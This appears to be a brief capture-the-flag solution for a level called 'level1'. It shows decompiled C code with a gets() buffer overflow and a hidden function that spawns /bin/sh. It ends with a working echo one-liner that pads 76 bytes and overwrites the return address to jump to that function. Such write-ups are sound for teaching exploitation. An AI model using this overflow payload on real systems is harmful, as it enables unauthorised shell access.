void main(void) {
    char local_50[76];
    gets(local_50);
    return;
}

void run(void) {
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    system("/bin/sh");
    return;
}
//0x804844a

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x4a\x84\x04\x08" | ./level1